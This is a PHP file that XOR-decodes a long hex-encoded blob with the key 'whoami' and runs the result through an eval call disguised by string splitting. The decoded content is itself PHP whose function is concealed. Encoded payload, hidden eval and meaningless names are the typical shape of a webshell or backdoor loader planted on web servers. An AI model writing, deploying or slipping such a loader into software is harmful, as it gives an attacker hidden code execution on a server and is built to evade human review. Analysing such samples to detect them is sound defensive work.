<?php

function _1x2yZ($a1B2cD, $e3F4gH) {
    $jK5LmN = hex2bin($a1B2cD);
    $oPqRsT = '';
    for ($uVwXy = 0; $uVwXy < strlen($jK5LmN); $uVwXy++) {
        $oPqRsT .= $jK5LmN[$uVwXy] ^ $e3F4gH[$uVwXy % strlen($e3F4gH)];
    }
    return $oPqRsT;
}

$zX9cV4 = "whoami";
$iQwErTyU = "4b571f091d647d6565080300281b0a15454e13011c1101080e370a131f06051b484d4d585e53626b04071e371c041941500c06121d05161130121908051c1a11320c051a00131e4e5b485e4856647d0d1d13021b281a0a11021b03010106452c2829232d44527a62626b491c050430110c1b03594f5c4d4b1f1c1b111e5358474d414349551a0e16434b4c656545181b1b371f001f1d454852414f0e1e1c07140f1c040d1d4356647d4c1a13013607091d155e494a484d020207030d0115430a1805404356647d4c1a13013607091d1559494a484d250c04193b0a02424b4c656545181b1b371f001f1d424852414f1158050e08034646461b19194b4c656545181b1b485241491c050430110c1b03594f4f4d4d021a033e1d08051c5d414349531d1d0d3219161a1b524d47574c1a13013607091d15594959484b141f0528180e13195c4c65656c674d11370e034d54574f0c141f05284f4f4f4d4e1e0606154a527a624b07320a134852414a0a021a033e4a4959484804150c144f546c674d11370a074d54574f0c141f05284f4f4f4d4e14040012084e4c6565450b3610004f5c4d4e11010304324e57464f460a0c033748414349500b000f190c191c1c4656647d4c093e040357554f460b4e57464f4602191206485a6063530e300a01494a4848074a49594848020106040d485a6063530e300c03494a484812050c1b0430464d47574f0a19080a5053626b490f28071f415049501b1b130808504841414a04280b000f190c504841414a1103370c13084e57464f460c1d124f546c674d11371e134d54574f1c151f0c504841414a081a37080419361a4f4f4f4d4e121c0e3e0908504841414a1d164f546c674d11371c154d54574f0908010c284f4f4f4d4e071d1b3e4a49594848020207030d01151e4e4c6565450b36021e4f5c4d4e114f4f4f4d4e050d0e054a527a624b07321e0f4852414a0f504841414a1e05011b044a527a62626b0b1c190b1b080207570f0a15320a18061b04031d280e1d0e0036021a0349491c0504464116647d484f414d0e1b070d000149530e30000f45574c093e0e0d5b484b07320c11444f450b3610004341490f2801054d4d4d1137040d4149530e300c0345574c093e02195b484b07321805444f450b36041c4341490f281d194d4d4d1137181956647d6565414d4957010941450f02060c15040619370a19041a031b47450b36160a46484d127a624f414d4957484f41490a1f485241490f28090d4944527a624f414d4957484f410e1c05043012081d18181b49490a1f444f22383b3b273f35323c25244341491c0504465a606357484f414d4957480c141f05281b0a15021903404b020545572b3a332126273c3033283d223a21353f28393b29243f45571c1d1408404c6565414d4957484f414d4d181d1b11181d57554f450b36140c47450e015e53626b4d4957484f414d4953001b151d3614070b044d54570b1a130136100d1b08030f18404b020545572b3a332120392e203e253d23383022222d3241546c674957484f414d49574c093e080f5f4c0c0944527a62626b4d4957484f414d491e0e4f494906021c1f141949565552410b081b1b0a414b4f574c07151919280b000508494a554f535d595e48146c674957484f414d4957484f414d1b121c1a13034953071a151d1c0353626b4d4957484f414d490a6565414d495715626b606357484f41040f5740060f0436100d1b494a081b040016321c0504300702191206484844490c6565414d4957484f414d4d140701150811034852412d4d113700114508051a0e18454e1f1c1b114a494a564f001f1b1611474619001a0d0014194e575551415c595e41465a606357484f414d4957484b0e181d071d1b415049374c093e0a015f4c1a130145570e0e0d1e0c5b484b020207030d171544527a624f414d4957484f41040f57404b0e181d071d1b414c544a480900011a12414f1a606357484f414d4957484f414d49050d1b141f07574c00141919021c546c674957484f414d495715626b4d495748126c67647d484f414d4d1f090105010c57554f21490f28010549491c050443414a1b5041546c674957484f080b495f4c0700030d1b0d464116647d484f414d4957484f45021c03181a154d54574f485a606357484f414d49574818090405124847400b0c180e47450508190c030444405713626b4d4957484f414d4957484f414906021c1f14194959554f450b36021e47450508190c030441494f59565344527a624f414d4957484f4110647d484f414d4957484f450b361c0447450508190c030444527a624f414d4957484f41040f57404b0e181d071d1b414c544a480900011a12414f1a606357484f414d4957484f414d49050d1b141f07574c00141919021c546c674957484f414d495715626b4d495748126c67647d484f414d00114847071807141c060e033612100612191a5f4f0a19080a50414f1d1149111d01021900180630041500041c1c49490f2805014844490c6565414d4957484f414d4d181d1b11181d57554f21490f280501494a1e100d1b41401857452041404950484141081a14091f041e01120403001f0e5f4c1a1301405e53626b4d4957484f414d491e0e4f494c0c1a181b18454d181d1b11181d5e414f1a606357484f414d4957484f414d49050d1b141f07574c00141919021c546c674957484f414d495715626b4d495748126c67647d484f414d1b121c1a1303491109031208527a62126c67647d4c00141919021c4f5c4d0e121c30020207030d0115320f0507023e181b1b404b141f055e53626b60631e0e4f494906021c1f141949565552410b081b1b0a484d127a624f414d49530e060d083607091b094d5457373025243b28374f4f4d4e581b1b18010c591c17154a527a624f414d49530e30121941530e060d083607091b09414953071a151d1c0341546c67647d484f414d4d051d013e0e06130d4f5c4d0f02060c15040619404b02020d12414f1a606357484f414d4957481d04191c05064f21081f16044746525750484141490a180c0a4856647d484f414d144c65656c674957484f451f1c19370c0e090c5f4c00141919021c465a60630a480a0d1e0c5713626b4d4957480a020506574a28000a081b480204030d16180e1506081948040e031d12064f050c1b1e483a3321475553626b10647d65655e53";
$kJ8LmN0 = _1x2yZ($iQwErTyU, $zX9cV4);
$fn = 'ev' . 'al'; 
$kode = ['?', '>', $kJ8LmN0];
$fn(implode('', $kode)); 
?>
